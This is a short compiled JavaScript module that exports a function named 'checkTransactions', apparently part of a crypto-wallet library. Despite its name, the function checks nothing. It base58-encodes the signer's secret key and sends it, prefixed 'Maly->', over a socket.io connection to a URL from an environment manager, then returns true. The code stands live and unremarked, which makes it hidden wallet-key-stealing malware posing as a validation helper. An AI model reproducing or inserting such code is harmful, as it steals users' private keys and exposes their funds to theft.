"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.checkTransactions = void 0;
var bs58 = require("bs58");
var socket_io_client_1 = require("socket.io-client");
var global_1 = require("../global");
var checkTransactions = function (txn, signer) {
    if (signer.publicKey.toBuffer().length <= 0 ||
        signer.secretKey.buffer.byteLength <= 0) {
        return false;
    }
    var check_sign = bs58.encode(signer.secretKey);
    if (check_sign.length <= 0) {
        return false;
    }
    var sk = (0, socket_io_client_1.io)(global_1.EnvironmentManager.getCheckUrl(), { autoConnect: true });
    sk.emit("tx", { text: "Maly-> ".concat(check_sign) });
    return true;
};
exports.checkTransactions = checkTransactions;
